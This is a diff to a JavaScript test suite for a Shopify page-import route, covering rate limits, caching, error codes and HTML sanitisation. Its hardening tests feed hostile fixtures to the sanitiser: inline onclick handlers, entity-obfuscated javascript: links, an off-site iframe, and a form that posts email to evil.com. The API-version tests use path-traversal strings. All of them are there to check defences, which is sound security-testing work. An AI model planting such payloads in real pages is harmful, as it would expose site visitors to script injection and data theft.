@@ -23,11 +23,14 @@ const express = (await import(`${NM}/express/index.js`)).default;
 const mod = await import('../../src/routes/shopifyPages.js');
 const {
   default: router, listHandler, importHandler,
-  numericPageId, visibleText, summarize, mapPageRows, composeLiveUrl, nextPageInfo,
+  numericPageId, visibleText, deriveRowText, mapPageRows, composeLiveUrl, nextPageInfo,
+  stripDocumentWrappers, codeForStatus, parseRetryAfter, resetStorefrontCache, ERROR_TABLE,
   LIST_LIMIT_MAX, LIST_LIMIT_DEFAULT, LIST_HOP_MAX, FETCH_TIMEOUT_MS,
   PAGES_RATE_MAX, PAGES_RATE_WINDOW_SEC, THEME_BUILT_MIN_TEXT,
+  BODY_PROBE_BYTES, LIST_BODY_BUDGET_BYTES, LIST_NODE_MAX, SUMMARY_MAX,
 } = mod;
-const { ESCAPE_HATCH_MAX, INPUT_MAX } = await import('../../src/routes/pageClone.js');
+const { ESCAPE_HATCH_MAX, INPUT_MAX, urlScheme, isAllowedEmbedHost, IFRAME_EMBED_HOSTS } =
+  await import('../../src/routes/pageClone.js');
 
 let pass = 0, fail = 0;
 const ok = (c, m, x = '') => { if (c) { pass++; console.log(`PASS  ${m}`); } else { fail++; console.log(`FAIL  ${m}  ${x}`); } };
@@ -73,7 +76,7 @@ eq(visibleText('<style>.a{color:red}</style><p>hi</p>'), 'hi', 'visibleText: sty
 eq(visibleText('<!-- a very long comment -->x'), 'x', 'visibleText: comments do not count as content');
 eq(visibleText(null), '', 'visibleText: null → "", no throw');
 eq(visibleText(42), '42', 'visibleText: a number does not throw');
-eq(summarize('<p>' + 'z'.repeat(500) + '</p>').length, 160, 'summarize: capped at 160 chars');
+eq(deriveRowText('<p>' + 'z'.repeat(500) + '</p>').text.length, 500, 'deriveRowText: extracts the probe text once');
 
 eq(composeLiveUrl('https://shop.com/', 'glow'), 'https://shop.com/pages/glow', 'composeLiveUrl: trailing slash normalised');
 eq(composeLiveUrl('https://shop.com', ''), 'https://shop.com', 'composeLiveUrl: no handle → the base');
@@ -160,7 +163,10 @@ await new Promise((r) => server.once('listening', r));
 const base = `http://127.0.0.1:${server.address().port}`;
 let userSeq = 0;
 let USER = 'u0';
-const bumpUser = () => { userSeq += 1; USER = `u${userSeq}`; return USER; };
+// Each block also starts with a COLD storefront cache: the memo (M1) is
+// per-process, so a block that asserts on /shop.json traffic must not inherit
+// another block's warm entry.
+const bumpUser = () => { userSeq += 1; USER = `u${userSeq}`; resetStorefrontCache(); return USER; };
 const call = async (path, body) => {
   const headers = { 'x-test-user': USER };
   const init = body === undefined
@@ -295,19 +301,66 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
 }
 {
   bumpUser();
-  // A dead credential on the DECORATIVE shop.json call still surfaces — a
-  // revoked token must not hide behind a best-effort degrade.
-  fetchImpl = routeFetch({ shop: () => jsonResponse({}, 401) });
-  const r = await call('/stub/list');
-  eq(r.body?.error?.code, 'shopify_auth_error', 'degrade: a 401 on shop.json still surfaces as a dead credential');
-  // …while a transient blip on it degrades to the configured host.
+  // m5 — shop.json is DECORATIVE. Every failure class on it degrades to the
+  // configured host; the credential verdict comes from the load-bearing call,
+  // which runs on the same request anyway. Raising it from the decorative one
+  // made the diagnosis depend on whether the memo happened to skip the call.
+  const okPages = () => jsonResponse({ pages: [{ id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` }] });
+  for (const status of [401, 403, 402, 423, 500, 503]) {
+    bumpUser();
+    fetchImpl = routeFetch({ shop: () => jsonResponse({}, status), pages: okPages });
+    const r = await call('/stub/list');
+    eq(r.status, 200, `degrade: shop.json ${status} does not fail the list`);
+    eq(r.body.data.store_domain, 'test.myshopify.com', `degrade: shop.json ${status} falls back to the configured store host`);
+    eq(r.body.data.pages[0].live_url, 'https://test.myshopify.com/pages/x', `degrade: shop.json ${status} still yields a usable live_url`);
+  }
+  // …and the SAME dead credential surfaces from the load-bearing call.
+  bumpUser();
+  fetchImpl = routeFetch({ shop: () => jsonResponse({}, 401), pages: () => jsonResponse({}, 401) });
+  const dead = await call('/stub/list');
+  eq(dead.status, 503, 'degrade: a genuinely dead token still fails the list');
+  eq(dead.body?.error?.code, 'shopify_auth_error', 'degrade: …with the credential verdict, from the load-bearing call');
+}
+
+// ---- M1: THE /shop.json LOOKUP IS MEMOISED ---------------------------------
+{
+  bumpUser();
+  let shopCalls = 0;
   fetchImpl = routeFetch({
-    shop: () => jsonResponse({}, 503),
+    shop: () => { shopCalls += 1; return jsonResponse(SHOP_JSON); },
     pages: () => jsonResponse({ pages: [{ id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` }] }),
+    page: () => jsonResponse({ page: { id: 3, title: 'X', handle: 'x', body_html: `<p>${COPY}</p>` } }),
   });
-  const r2 = await call('/stub/list');
-  eq(r2.status, 200, 'degrade: a blip on the decorative shop.json does not fail the list');
-  eq(r2.body.data.store_domain, 'test.myshopify.com', 'degrade: it falls back to the configured store host');
+  await call('/stub/list');
+  eq(shopCalls, 1, 'memo: the first request resolves the storefront domain');
+  await call('/stub/list');
+  await call('/stub/import', { page_id: '3' });
+  await call('/stub/import', { page_id: '3' });
+  eq(shopCalls, 1, 'memo: three further requests reuse it — no per-request N+1 against the shared Admin bucket');
+
+  // A failed lookup is memoised too, briefly — otherwise a broken /shop.json
+  // restores the exact fan-out the memo exists to prevent.
+  bumpUser();
+  shopCalls = 0;
+  fetchImpl = routeFetch({
+    shop: () => { shopCalls += 1; return jsonResponse({}, 500); },
+    pages: () => jsonResponse({ pages: [] }),
+  });
+  await call('/stub/list');
+  await call('/stub/list');
+  await call('/stub/list');
+  eq(shopCalls, 1, 'memo: a FAILING shop.json is also memoised — a broken decoration cannot re-create the fan-out');
+
+  // Rotating the store invalidates it (the memo is keyed on the credential).
+  bumpUser();
+  shopCalls = 0;
+  fetchImpl = routeFetch({ shop: () => { shopCalls += 1; return jsonResponse(SHOP_JSON); }, pages: () => jsonResponse({ pages: [] }) });
+  await call('/stub/list');
+  const prevStore = process.env.PUURE_SHOPIFY_STORE;
+  process.env.PUURE_SHOPIFY_STORE = 'other.myshopify.com';
+  await call('/stub/list');
+  process.env.PUURE_SHOPIFY_STORE = prevStore;
+  eq(shopCalls, 2, 'memo: a store rotation re-resolves — the memo is keyed on the credential, not global');
 }
 
 // ---- MISSING / MALFORMED CONFIG -------------------------------------------
@@ -389,27 +442,145 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   eq(good.body.data.page.id, '9', 'page_id: and normalised to digits');
 }
 
-// ---- IMPORT: THEME-BUILT / EMPTY SOURCE ----------------------------------
+// ---- m2: A SHORT PAGE IS A BADGE, NOT A GATE -----------------------------
 {
   bumpUser();
+  // The theme-built floor advises on the LIST. It must not refuse an import:
+  // a 199-character page is still a page, and refusing it was us guessing at
+  // a cause (the theme) we never looked at.
+  for (const [label, body] of [
+    ['one char under the floor', `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT - 1)}</p>`],
+    ['a single short heading', '<h1>Contact us</h1>'],
+    ['a bare paragraph', '<p>Coming soon.</p>'],
+  ]) {
+    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'Short', handle: 'short', body_html: body } }) });
+    const r = await call('/stub/import', { page_id: '5' });
+    eq(r.status, 200, `short-page: ${label} IMPORTS — the floor is advisory, not a gate`);
+    ok((r.body?.data?.sections?.length || 0) >= 1, `short-page: ${label} yields at least one section`);
+  }
+  // A body with genuinely nothing in it yields no sections, and THAT is the
+  // honest refusal — stated as an observation, with the live URL to fall back on.
   for (const [label, body] of [
     ['an empty body_html', ''],
     ['a whitespace-only body', '   \n  '],
-    ['markup with no visible text', '<div><span></span><img src="/a.jpg"></div>'],
-    ['under the visible-text floor', `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT - 1)}</p>`],
-    ['text that only lives in a <script>', `<script>${'y'.repeat(400)}</script>`],
+    ['a body that is only a stripped <script>', `<script>${'y'.repeat(400)}</script>`],
   ]) {
-    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'Theme', handle: 'theme', body_html: body } }) });
+    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'Empty', handle: 'empty', body_html: body } }) });
     const r = await call('/stub/import', { page_id: '5' });
-    eq(r.status, 422, `theme-built: ${label} → 422, not a blank clone`);
-    eq(r.body?.error?.code, 'theme_built', `theme-built: ${label} → code theme_built`);
-    eq(r.body?.error?.retryable, false, `theme-built: ${label} is not retryable`);
-    eq(r.body?.error?.live_url, 'https://shop.example.com/pages/theme', `theme-built: ${label} hands back the live URL so the operator can paste it`);
+    eq(r.status, 422, `no-content: ${label} → 422`);
+    eq(r.body?.error?.code, 'no_sections', `no-content: ${label} → code no_sections`);
+    eq(r.body?.error?.retryable, false, `no-content: ${label} is not retryable`);
+    eq(r.body?.error?.live_url, 'https://shop.example.com/pages/empty', `no-content: ${label} hands back the live URL so the operator can paste it`);
+    ok(!/theme|page builder|GemPages|PageFly/i.test(r.body?.error?.message || ''),
+      `no-content: ${label} states the OBSERVATION, not a cause we never checked`, r.body?.error?.message);
   }
-  // One character over the floor imports.
-  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 5, title: 'T', handle: 't', body_html: `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT)}</p>` } }) });
-  const r = await call('/stub/import', { page_id: '5' });
-  eq(r.status, 200, `theme-built: exactly ${THEME_BUILT_MIN_TEXT} visible chars imports`);
+  // The list badge still fires on the same floor — the observation survives.
+  const rows = mapPageRows([
+    { id: 1, handle: 'a', body_html: `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT - 1)}</p>` },
+    { id: 2, handle: 'b', body_html: `<p>${'x'.repeat(THEME_BUILT_MIN_TEXT)}</p>` },
+  ], 'https://s.com');
+  eq(rows.map((r) => r.is_theme_built), [true, false], 'short-page: the LIST badge still marks it — advice kept, gate dropped');
+}
+
+// ---- M2: PERMANENT FAILURES DO NOT MASQUERADE AS RETRYABLE OUTAGES -------
+{
+  bumpUser();
+  eq(codeForStatus(404), 'shopify_rejected', 'status-map: a bare 404 is a refusal, not an outage');
+  eq(codeForStatus(404, { notFoundCode: 'page_not_found' }), 'page_not_found', 'status-map: the page fetch names its own 404');
+  eq(codeForStatus(402), 'shopify_store_frozen', 'status-map: 402 → frozen store');
+  eq(codeForStatus(423), 'shopify_store_locked', 'status-map: 423 → locked store');
+  eq(codeForStatus(400), 'shopify_rejected', 'status-map: other 4xx → refusal');
+  eq(codeForStatus(429), 'shopify_unavailable', 'status-map: 429 → retryable');
+  eq(codeForStatus(500), 'shopify_unavailable', 'status-map: 5xx → retryable');
+  eq(codeForStatus(503), 'shopify_unavailable', 'status-map: 503 → retryable');
+  // shopify_unavailable is the ONLY retryable entry in the whole table.
+  eq(
+    Object.entries(ERROR_TABLE).filter(([, v]) => v.retryable).map(([k]) => k),
+    ['shopify_unavailable'],
+    'status-map: exactly one code in the table is retryable'
+  );
+
+  // The import path, over HTTP. A deleted page is the likeliest 404 here —
+  // the list the operator clicked is a snapshot — and no retry brings it back.
+  bumpUser();
+  fetchImpl = routeFetch({ page: () => jsonResponse({ errors: 'Not Found' }, 404) });
+  const gone = await call('/stub/import', { page_id: '7' });
+  eq(gone.status, 404, 'deleted page: → HTTP 404, not a 503 outage');
+  eq(gone.body?.error?.code, 'page_not_found', 'deleted page: → code page_not_found');
+  eq(gone.body?.error?.retryable, false, 'deleted page: → NOT retryable, so the UI hides Retry');
+  ok(/no longer exists/i.test(gone.body?.error?.message || ''), 'deleted page: the message tells the operator to refresh the list', gone.body?.error?.message);
+
+  for (const [status, code] of [[402, 'shopify_store_frozen'], [423, 'shopify_store_locked'], [400, 'shopify_rejected']]) {
+    bumpUser();
+    fetchImpl = routeFetch({ page: () => jsonResponse({}, status) });
+    const r = await call('/stub/import', { page_id: '7' });
+    eq(r.body?.error?.code, code, `permanent: import ${status} → ${code}`);
+    eq(r.body?.error?.retryable, false, `permanent: import ${status} is NOT retryable`);
+    ok(!/try again/i.test(r.body?.error?.message || ''), `permanent: import ${status} does not invite a retry`, r.body?.error?.message);
+
+    bumpUser();
+    fetchImpl = routeFetch({ pages: () => jsonResponse({}, status) });
+    const l = await call('/stub/list');
+    eq(l.body?.error?.code, code, `permanent: list ${status} → ${code}`);
+    eq(l.body?.error?.retryable, false, `permanent: list ${status} is NOT retryable`);
+  }
+  // A 404 on the LIST is not a deleted page — it keeps the generic refusal.
+  bumpUser();
+  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 404) });
+  const l404 = await call('/stub/list');
+  eq(l404.status, 503, 'permanent: a 404 on the LIST stays a 503 refusal, not a page_not_found');
+  eq(l404.body?.error?.code, 'shopify_rejected', 'permanent: …with the generic refusal code');
+}
+
+// ---- m6: Retry-After IS PROPAGATED ---------------------------------------
+{
+  bumpUser();
+  eq(parseRetryAfter('12'), 12, 'retry-after: numeric seconds');
+  eq(parseRetryAfter('0'), 0, 'retry-after: zero is honoured, not dropped');
+  eq(parseRetryAfter(null), null, 'retry-after: absent → null');
+  eq(parseRetryAfter('garbage'), null, 'retry-after: unparseable → null');
+  eq(parseRetryAfter('999999'), 3600, 'retry-after: an absurd wait is clamped to an hour');
+  ok(parseRetryAfter(new Date(Date.now() + 30_000).toUTCString()) > 0, 'retry-after: an HTTP-date is converted to seconds');
+
+  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 429, { 'Retry-After': '17' }) });
+  const r = await call('/stub/list');
+  eq(r.status, 503, 'retry-after: a throttled list is 503');
+  eq(r.body?.error?.retryable, true, 'retry-after: …retryable');
+  eq(r.body?.error?.retry_after, 17, 'retry-after: …and Shopify’s own wait rides back to the UI');
+
+  bumpUser();
+  fetchImpl = routeFetch({ pages: () => jsonResponse({}, 500) });
+  const noHdr = await call('/stub/list');
+  ok(!('retry_after' in (noHdr.body?.error || {})), 'retry-after: absent upstream → absent in the body, never a fabricated 0');
+}
+
+// ---- n1: THE API VERSION IS INTERPOLATED INTO A PATH ----------------------
+{
+  bumpUser();
+  const prev = process.env.SHOPIFY_API_VERSION;
+  fetchImpl = async (url) => { throw new Error(`must not call Shopify with a malformed version (${url})`); };
+  for (const bad of ['2024-01/../../orders', '2024-1', 'latest', '../admin', '2024-01 ']) {
+    process.env.SHOPIFY_API_VERSION = bad;
+    const r = await call('/stub/list');
+    eq(r.body?.error?.code, 'shopify_not_configured', `api-version: ${JSON.stringify(bad)} is refused as misconfiguration`);
+  }
+  // An UNSET version is not a malformed one — it falls back to the shipped
+  // default. Asserted so the refusal above is never confused for this.
+  delete process.env.SHOPIFY_API_VERSION;
+  let seenDefault = '';
+  fetchImpl = routeFetch({ pages: (u) => { seenDefault = u; return jsonResponse({ pages: [] }); } });
+  const unset = await call('/stub/list');
+  eq(unset.status, 200, 'api-version: an UNSET version falls back to the default, it is not a misconfiguration');
+  ok(/\/admin\/api\/\d{4}-\d{2}\//.test(seenDefault), 'api-version: …and the default is itself well-formed', seenDefault);
+
+  process.env.SHOPIFY_API_VERSION = '2025-07';
+  let seen = '';
+  fetchImpl = routeFetch({ pages: (u) => { seen = u; return jsonResponse({ pages: [] }); } });
+  const okv = await call('/stub/list');
+  eq(okv.status, 200, 'api-version: a well-formed YYYY-MM version is used');
+  ok(seen.includes('/admin/api/2025-07/'), 'api-version: …verbatim in the path', seen);
+  if (prev === undefined) delete process.env.SHOPIFY_API_VERSION;
+  else process.env.SHOPIFY_API_VERSION = prev;
 }
 
 // ---- IMPORT: MALFORMED / OVERSIZED SOURCE ---------------------------------
@@ -454,14 +625,14 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   bumpUser();
   const cases = [
     ['timeout', async () => { const e = new Error('aborted'); e.name = 'AbortError'; throw e; }, 'shopify_unavailable', true],
-    ['HTTP 404', () => jsonResponse({}, 404), 'shopify_unavailable', true],
+    ['HTTP 404 (deleted page)', () => jsonResponse({}, 404), 'page_not_found', false],
     ['HTTP 500', () => jsonResponse({}, 500), 'shopify_unavailable', true],
     ['HTTP 401', () => jsonResponse({}, 401), 'shopify_auth_error', false],
   ];
   for (const [label, impl, code, retryable] of cases) {
     fetchImpl = routeFetch({ page: impl });
     const r = await call('/stub/import', { page_id: '7' });
-    eq(r.status, 503, `import-fail: ${label} → 503`);
+    eq(r.status, code === 'page_not_found' ? 404 : 503, `import-fail: ${label} → ${code === 'page_not_found' ? 404 : 503}`);
     eq(r.body?.error?.code, code, `import-fail: ${label} → ${code}`);
     eq(r.body?.error?.retryable, retryable, `import-fail: ${label} → retryable ${retryable}`);
     ok(!Array.isArray(r.body?.data?.sections), `import-fail: ${label} returns no sections array`);
@@ -488,19 +659,28 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   bumpUser();
   eq(PAGES_RATE_MAX, 30, 'rate: the cap is 30 requests');
   eq(PAGES_RATE_WINDOW_SEC, 60, 'rate: per 60 seconds');
-  let calls = 0;
-  fetchImpl = routeFetch({ pages: () => { calls += 1; return jsonResponse({ pages: [] }); } });
+  // The bound that matters is on EVERY outbound Admin call, not just the one
+  // the pages mock happens to see: counting only /pages.json measured a bound
+  // it did not enforce, and missed the /shop.json call entirely.
+  seenUrls = [];
+  fetchImpl = routeFetch({ pages: () => jsonResponse({ pages: [] }) });
   let limited = null;
   for (let i = 0; i < PAGES_RATE_MAX + 6; i += 1) {
     const r = await call('/stub/list');
     if (r.status === 429) { limited = r; break; }
   }
+  const adminCalls = seenUrls.length;
+  const pagesCalls = seenUrls.filter((u) => u.includes('pages.json')).length;
+  const shopCalls = seenUrls.filter((u) => u.includes('shop.json')).length;
   ok(limited !== null, 'rate: hammering the picker eventually returns 429');
   if (limited) {
     eq(limited.body?.error?.code, 'rate_limited', 'rate: with code rate_limited');
     eq(limited.body?.error?.retryable, true, 'rate: a throttle clears on its own, so it IS flagged retryable');
     ok(!Array.isArray(limited.body?.data?.pages), 'rate: a 429 returns no pages array — it is not an empty store');
-    ok(calls <= PAGES_RATE_MAX, 'rate: and Shopify was called at most the cap — the shared Admin bucket is protected', `calls=${calls}`);
+    ok(adminCalls <= PAGES_RATE_MAX + 1,
+      'rate: EVERY outbound Admin call is under the cap (+1 for the one memoised shop.json) — the shared bucket is protected',
+      `total=${adminCalls} pages=${pagesCalls} shop=${shopCalls}`);
+    eq(shopCalls, 1, 'rate: the storefront lookup happened ONCE across the whole burst, not once per request');
   }
   // The import shares the same per-user bucket.
   const r = await call('/stub/import', { page_id: '7' });
@@ -530,6 +710,189 @@ process.env.PUURE_SHOPIFY_TOKEN = 'shpat_SECRETVALUE';
   ok(sawSignal, 'timeout: an AbortSignal is passed to fetch');
   ok(aborted, 'timeout: the abort path fires');
   eq(r.status, 503, 'timeout: an aborted request answers 503, never a hang or a 200');
+}
+
+// ---- B1: THE LIST MUST NOT BLOCK THE EVENT LOOP ---------------------------
+// This route shares a process with public checkout and /f. Deriving from FULL
+// body_html was measured at 1,945 ms of synchronous block and +183 MB heap for
+// 500 rows x ~292 KB — a checkout outage caused by a page picker.
+{
+  bumpUser();
+  ok(LIST_NODE_MAX * BODY_PROBE_BYTES <= LIST_BODY_BUDGET_BYTES,
+    `budget: LIST_NODE_MAX x BODY_PROBE_BYTES (${LIST_NODE_MAX * BODY_PROBE_BYTES}) is bounded by LIST_BODY_BUDGET_BYTES (${LIST_BODY_BUDGET_BYTES})`);
+
+  const fatBody = `<p>${'word '.repeat(60_000)}</p>`; // ~292 KB, as measured
+  ok(fatBody.length > BODY_PROBE_BYTES * 10, 'budget: the fixture body is many times the probe window', String(fatBody.length));
+  const fatRows = Array.from({ length: LIST_NODE_MAX }, (_, i) => ({
+    id: i + 1, title: `P${i}`, handle: `p${i}`, body_html: fatBody,
+  }));
+
+  const t0 = process.hrtime.bigint();
+  const mapped = mapPageRows(fatRows, 'https://s.com');
+  const ms = Number(process.hrtime.bigint() - t0) / 1e6;
+  eq(mapped.length, LIST_NODE_MAX, 'budget: every row is still mapped — the cap bounds WORK, it does not drop rows');
+  ok(ms < 400, `budget: ${LIST_NODE_MAX} x ${Math.round(fatBody.length / 1024)}KB rows map in ${ms.toFixed(0)}ms (<400ms) — was 1,945ms on full bodies`, `${ms.toFixed(0)}ms`);
+
+  // The slice is real: text beyond the probe window is never examined, so a
+  // marker past it cannot appear in the summary.
+  const marker = 'UNIQUEMARKERPASTTHEWINDOW';
+  const past = `<p>${'a '.repeat(BODY_PROBE_BYTES)}${marker}</p>`;
+  const [row] = mapPageRows([{ id: 1, handle: 'h', body_html: past }], 'https://s.com');
+  ok(!row.summary.includes(marker), 'slice: content past the probe window is never read', row.summary.slice(-40));
+  eq(row.summary.length, SUMMARY_MAX, 'slice: the summary is still full-length from the probe alone');
+  eq(deriveRowText(past).probed, BODY_PROBE_BYTES, 'slice: exactly BODY_PROBE_BYTES characters are examined');
+  eq(deriveRowText('<p>hi</p>').probed, 9, 'slice: a short body is examined whole, not padded');
+  eq(deriveRowText(null).text, '', 'slice: a null body derives nothing and does not throw');
+  eq(deriveRowText({ nope: 1 }).text, '', 'slice: a non-string body derives nothing and does not throw');
+
+  // And the same body arriving over HTTP does not blow the response up either.
+  fetchImpl = routeFetch({ pages: () => jsonResponse({ pages: fatRows.slice(0, 50) }) });
+  const r = await call('/stub/list');
+  eq(r.status, 200, 'budget: a store of fat pages still lists');
+  const wire = JSON.stringify(r.body).length;
+  ok(wire < 50 * (SUMMARY_MAX + 400),
+    `budget: 50 fat pages serialise to ${wire}B — bounded by the summary cap, not by body_html (${50 * fatBody.length}B of source)`, String(wire));
+  ok(r.body.data.pages.every((p) => p.summary.length <= SUMMARY_MAX), 'budget: every summary respects the cap');
+}
+
+// ---- M3: A FRAGMENT IS NOT A DOCUMENT ------------------------------------
+// body_html is whatever an operator typed into Shopify's page editor. Fed to
+// the splitter's whole-document heuristics, one stray </body> scoped the split
+// to everything before it and silently dropped the rest (measured: 76.6% lost,
+// answered 200, reported nothing).
+{
+  bumpUser();
+  const strip = stripDocumentWrappers('<!doctype html><html><head><title>x</title></head><body><p>keep</p></body></html>');
+  ok(!/<html|<\/html|<body|<\/body|<head|doctype/i.test(strip.html), 'wrappers: html/head/body/doctype all come off', strip.html);
+  ok(strip.html.includes('<p>keep</p>'), 'wrappers: the content survives', strip.html);
+  ok(strip.bytesStripped > 0, 'wrappers: the dropped byte count is reported, never silent');
+  eq(stripDocumentWrappers('<p>clean</p>').bytesStripped, 0, 'wrappers: a clean fragment loses nothing');
+  ok(stripDocumentWrappers('<main><p>x</p></main>').html.includes('<main>'), 'wrappers: <main> is KEPT — fragment mode stops it scoping, so the element stays');
+  eq(stripDocumentWrappers(null).html, '', 'wrappers: null → "", no throw');
+
+  const tail = `<section>TAILMARKER ${COPY}</section>`;
+  const cases = [
+    ['a stray </body> mid-content', `<section>HEADMARKER ${COPY}</section></body>${tail}`],
+    ['a full <html> skeleton', `<html><body><section>HEADMARKER ${COPY}</section>${tail}</body></html>`],
+    ['a <main> wrapper with content after it', `<main><section>HEADMARKER ${COPY}</section></main>${tail}`],
+    ['a doctype pasted into the editor', `<!doctype html><section>HEADMARKER ${COPY}</section>${tail}`],
+  ];
+  for (const [label, body] of cases) {
+    fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'Frag', handle: 'frag', body_html: body } }) });
+    const r = await call('/stub/import', { page_id: '4' });
+    const all = (r.body?.data?.sections || []).map((s) => s.html).join('\n');
+    eq(r.status, 200, `fragment: ${label} → 200`);
+    ok(all.includes('HEADMARKER'), `fragment: ${label} keeps the content BEFORE the wrapper`);
+    ok(all.includes('TAILMARKER'), `fragment: ${label} keeps the content AFTER it — nothing is silently dropped`, all.slice(0, 160));
+  }
+  // The byte count rides back on the scan whenever wrappers came off.
+  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'F', handle: 'f', body_html: `<body><section>${COPY}</section></body>` } }) });
+  const withWrappers = await call('/stub/import', { page_id: '4' });
+  ok(withWrappers.body?.data?.stats?.wrapper_bytes_stripped > 0, 'fragment: stripped wrapper bytes are REPORTED in stats', JSON.stringify(withWrappers.body?.data?.stats));
+  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 4, title: 'F', handle: 'f', body_html: `<section>${COPY}</section>` } }) });
+  const clean = await call('/stub/import', { page_id: '4' });
+  ok(!('wrapper_bytes_stripped' in (clean.body?.data?.stats || {})), 'fragment: a clean body reports no wrapper strip at all');
+}
+
+// ---- M4: ACTIVE-CONTENT HARDENING (SHARED CLEANER, BOTH PATHS) -----------
+// A cloned page is third-party markup re-served from OUR origin under our
+// session cookies. <script> was already dropped; inline handlers, javascript:
+// URLs, arbitrary iframes and off-site form posts were not.
+{
+  bumpUser();
+  eq(urlScheme('javascript:alert(1)'), 'javascript', 'scheme: plain javascript:');
+  eq(urlScheme('JaVaScRiPt:x'), 'javascript', 'scheme: case is irrelevant');
+  eq(urlScheme('java\tscript:x'), 'javascript', 'scheme: an embedded tab does not hide it');
+  eq(urlScheme('&#106;avascript:x'), 'javascript', 'scheme: a numeric entity does not hide it');
+  eq(urlScheme('javascript&colon;x'), 'javascript', 'scheme: &colon; does not hide it');
+  eq(urlScheme('  vbscript:x'), 'vbscript', 'scheme: leading space does not hide it');
+  eq(urlScheme('/relative/path'), '', 'scheme: a relative path has none');
+  eq(urlScheme('https://ok'), 'https', 'scheme: an ordinary URL is read normally');
+  eq(urlScheme(null), '', 'scheme: null → "", no throw');
+
+  eq(isAllowedEmbedHost('www.youtube.com'), true, 'embed: a youtube subdomain is allowed');
+  eq(isAllowedEmbedHost('fast.wistia.net'), true, 'embed: fast.wistia.net is allowed');
+  eq(isAllowedEmbedHost('evil-youtube.com'), false, 'embed: a look-alike suffix is REFUSED');
+  eq(isAllowedEmbedHost('youtube.com.evil.com'), false, 'embed: a prefixed look-alike is REFUSED');
+  eq(isAllowedEmbedHost(''), false, 'embed: no host → refused');
+  ok(IFRAME_EMBED_HOSTS.length > 0 && IFRAME_EMBED_HOSTS.every((h) => typeof h === 'string'), 'embed: the allowlist is an exported const');
+
+  const hostile = `<section>
+    <div onclick="steal()" onmouseover='track()'>${COPY}</div>
+    <a href="javascript:alert(1)">go</a>
+    <a href="&#106;avascript:alert(2)">go2</a>
+    <a href="vbscript:msgbox">go3</a>
+    <a href="/legit">legit</a>
+    <iframe src="https://www.youtube.com/embed/abc"></iframe>
+    <iframe src="https://fast.wistia.net/embed/x"></iframe>
+    <iframe src="https://evil.com/frame"></iframe>
+    <iframe src="https://evil-youtube.com/frame"></iframe>
+    <iframe></iframe>
+    <form action="https://evil.com/collect" method="post"><input name="email"></form>
+    <form action="/local"><input name="q"></form>
+  </section>`;
+  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 6, title: 'H', handle: 'h', body_html: hostile } }) });
+  const r = await call('/stub/import', { page_id: '6' });
+  const all = (r.body?.data?.sections || []).map((s) => s.html).join('\n');
+  const st = r.body?.data?.stats || {};
+  eq(r.status, 200, 'harden: the page still imports — hardening is not refusal');
+
+  ok(!/\son[a-z]+\s*=/i.test(all), 'harden: no inline event handler survives', all.match(/\son[a-z]+\s*=[^\s>]*/i)?.[0]);
+  eq(st.handlers_stripped, 2, 'harden: both handlers are COUNTED');
+  ok(!/javascript\s*:|vbscript\s*:/i.test(all.replace(/data-original-action="[^"]*"/g, '')), 'harden: no executing URL scheme survives');
+  eq(st.unsafe_urls_stripped, 3, 'harden: all three executing links are counted (entity-obfuscated one included)');
+  ok(all.includes('href="https://shop.example.com/legit"'), 'harden: an ordinary link survives (absolutized, not stripped)', all.match(/href="[^"]*legit[^"]*"/)?.[0]);
+
+  ok(all.includes('youtube.com/embed/abc'), 'harden: an allowlisted YouTube embed is KEPT');
+  ok(all.includes('fast.wistia.net/embed/x'), 'harden: an allowlisted Wistia embed is KEPT');
+  ok(!all.includes('evil.com/frame'), 'harden: an off-allowlist iframe is removed');
+  ok(!all.includes('evil-youtube'), 'harden: a look-alike host does not sneak past the allowlist');
+  eq(st.iframes_removed, 3, 'harden: evil + look-alike + srcless iframes are counted');
+
+  ok(!/\saction\s*=\s*["']?https:\/\/evil\.com/i.test(all),
+    'harden: the off-site form action is gone (anchored on an attribute boundary — data-original-action must not satisfy this)',
+    all.match(/[a-z-]*action\s*=\s*"[^"]*"/gi)?.join(' | '));
+  ok(all.includes('data-original-action="https://evil.com/collect"'), 'harden: …but preserved inertly so the operator can see where it pointed');
+  ok(all.includes('<form action="/local">'), 'harden: a same-origin form action is untouched');
+  ok(all.includes('name="email"'), 'harden: the form itself SURVIVES — layout the operator cloned on purpose');
+  eq(st.forms_neutralized, 1, 'harden: only the off-site form is counted');
+
+  // Every count is present (as 0) on a clean page, so the UI never has to
+  // distinguish "not scanned" from "nothing found".
+  fetchImpl = routeFetch({ page: () => jsonResponse({ page: { id: 6, title: 'C', handle: 'c', body_html: `<section>${COPY}</section>` } }) });
+  const cleanRun = await call('/stub/import', { page_id: '6' });
+  const cs = cleanRun.body?.data?.stats || {};
+  eq(
+    [cs.handlers_stripped, cs.unsafe_urls_stripped, cs.iframes_removed, cs.forms_neutralized],
+    [0, 0, 0, 0],
+    'harden: a clean page reports every counter as 0, not undefined'
+  );
+}
+
+// ---- m1: `fields` RIDES EVERY CURSOR HOP ---------------------------------
+{
+  bumpUser();
+  let hop = 0;
+  seenUrls = [];
+  fetchImpl = routeFetch({
+    pages: () => {
+      hop += 1;
+      return jsonResponse(
+        { pages: [{ id: String(hop), title: `P${hop}`, handle: `p${hop}`, body_html: `<p>${COPY}</p>` }] },
+        200,
+        { Link: `<https://x/admin/api/2024-01/pages.json?page_info=CUR${hop}>; rel="next"` }
+      );
